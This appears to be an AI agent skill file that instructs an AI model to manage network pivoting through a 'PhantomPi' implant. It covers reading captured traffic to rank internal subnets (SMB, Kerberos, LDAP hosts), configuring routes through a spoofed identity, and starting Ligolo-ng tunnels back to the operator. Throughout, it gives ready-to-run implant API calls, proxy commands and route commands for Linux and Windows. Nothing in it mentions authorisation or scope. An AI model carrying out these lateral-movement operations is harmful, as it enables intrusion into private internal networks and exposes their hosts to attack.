---
name: pivot
description: >
  Manage network pivoting through a PhantomPi implant: check pivot readiness,
  discover reachable internal subnets from captured traffic, set up routes
  through the spoofed identity on veth1, and manage Ligolo-ng agent sessions.
  Triggers on: pivot, ligolo, route, tunnel, reach, subnet, internal, lateral,
  movement, session, agent, proxy.
metadata: {"openclaw":{"requires":{"bins":["curl","nc"]},"os":["linux"]}}
---

# Pivot

You help the operator set up network pivoting through a PhantomPi implant
and manage Ligolo-ng agent sessions.

## Command 1: "Pivot to X" / "What can I reach?"

### Step 1 — always fetch pivot status first

```bash
bash /home/openclaw/scripts/query-implant.sh /pivot-status [IMPLANT_IP]
```

**If `pivot_ready` is `false`:**
Tell the operator the implant is not ready for pivoting. They must first
run `spoof-target.sh` on the implant via SSH to create the veth0/veth1 pair.
Do not proceed.

**If `pivot_ready` is `true`:**
Show the operator:
- Spoofed identity: `spoofed.ip`, `spoofed.hostname`, `spoofed.gateway`, `spoofed.dns`
- Already configured routes: `current_routes` (if any)
- Suggested subnets from captured traffic: `suggested_subnets`

Present `suggested_subnets` as a prioritised list. Each entry has:
- `subnet`: the /24 block seen in traffic
- `packets`: how many packets were captured to that subnet (higher = more active)
- `hint`: protocols detected (SMB, Kerberos, LDAP, RDP, etc.)

Example presentation:
> Based on captured traffic, here are reachable internal subnets:
> - `192.168.10.0/24` — 847 pkts (SMB, Kerberos) — likely DC/file share traffic
> - `10.10.5.0/24` — 312 pkts (LDAP, RDP)
> - `172.16.0.0/24` — 44 pkts (HTTP)
>
> Which ones do you want to route through the pivot?

### Step 2 — set up routes (when operator confirms subnets)

```bash
bash /home/openclaw/scripts/query-implant.sh --post /pivot-setup \
  '{"subnets":["192.168.10.0/24","10.10.5.0/24"]}' [IMPLANT_IP]
```

Response fields: `gateway` (used automatically from log), `configured`, `skipped`, `failed`.
Report what was configured. Flag any failures.

### Reset pivot routes

Remove specific subnets:
```bash
bash /home/openclaw/scripts/query-implant.sh --post /pivot-reset \
  '{"subnets":["192.168.10.0/24"]}' [IMPLANT_IP]
```

Remove all routes on veth1:
```bash
bash /home/openclaw/scripts/query-implant.sh --post /pivot-reset '{}' [IMPLANT_IP]
```

---

## Command 2: Ligolo session management

Ligolo-ng allows the operator to tunnel traffic through the implant to
internal hosts. The implant runs the **agent**; the operator runs the
**proxy** on their own machine.

### List active sessions

```bash
bash /home/openclaw/scripts/query-implant.sh /ligolo-sessions [IMPLANT_IP]
```

Returns list of `{session, proxy_ip, running}`. `running: false` means the
agent process exited (proxy likely not reachable or not started yet).

### Start a session

```bash
bash /home/openclaw/scripts/query-implant.sh --post /ligolo-start \
  '{"proxy_ip":"10.8.0.2","proxy_port":11601}' [IMPLANT_IP]
```

- `proxy_ip`: the operator's WireGuard IP (where ligolo-proxy is listening)
- `proxy_port`: default 11601
- Creates tmux session `ligolo-<proxy_ip>` on the implant
- If session already exists, returns `"status": "already_running"`

After reporting a successful start, always output the exact commands the
operator must run on their own machine. Ask if unsure about their OS;
otherwise infer from context (e.g. Windows if they mention .exe, PowerShell).

**Linux:**
```bash
# 1. Start the proxy (run once, keep it open)
./ligolo-proxy -selfcert -laddr 0.0.0.0:11601

# 2. After the agent connects in the proxy shell, start the tunnel:
#    session                    (select the session)
#    start                      (start tunnel)

# 3. Add routes for each routed subnet (one per line):
sudo ip route add 192.168.10.0/24 dev ligolo0
sudo ip route add 10.10.5.0/24 dev ligolo0

# 4. DNS (if a DNS server was detected):
echo "nameserver 192.168.1.10" | sudo tee /etc/resolv.conf
```

**Windows (run as Administrator):**
```powershell
# 1. Start the proxy
.\ligolo-proxy.exe -selfcert -laddr 0.0.0.0:11601

# 2. After agent connects, start the tunnel in the proxy shell:
#    session
#    start

# 3. Add routes (replace IDX with the ligolo interface index from: route print)
route add 192.168.10.0 mask 255.255.255.0 0.0.0.1 if IDX
route add 10.10.5.0 mask 255.255.255.0 0.0.0.1 if IDX

# 4. DNS (if a DNS server was detected):
netsh interface ip set dns "ligolo0" static 192.168.1.10
```

Always fill in the real subnet values and DNS IP from the pivot-status response.
Never output placeholder routes — generate one line per configured subnet.

### Kill a specific session

```bash
bash /home/openclaw/scripts/query-implant.sh --post /ligolo-kill \
  '{"session":"ligolo-10.8.0.2"}' [IMPLANT_IP]
```

### Kill all sessions

```bash
bash /home/openclaw/scripts/query-implant.sh --post /ligolo-kill \
  '{"session":"all"}' [IMPLANT_IP]
```

---

## Targeting implants

- For general queries omit the IP: the script reads `$IMPLANT_IPS` automatically.
- For POST operations (setup, start, kill) always pass the specific implant IP —
  write operations are never broadcast to all implants.
- If the operator does not specify which implant, ask before proceeding with
  any write operation when multiple implants are configured.

## Reporting guidelines

1. Always show spoofed identity context before discussing routes.
2. Present subnet suggestions as a prioritised list with protocol hints.
3. Do not set up routes without the operator explicitly confirming the targets.
4. For Ligolo sessions: show session name, proxy IP, and whether the agent is still running.
5. **After any action that affects the operator's machine** (route setup, Ligolo start),
   always output a complete copy-paste block of commands for their OS — Linux and Windows
   unless the operator's OS is already known. Fill in real values (subnets, IPs, DNS).
   Never use placeholders like `<subnet>` in the final output block.
6. If the operator's OS is unknown, output both Linux and Windows blocks.
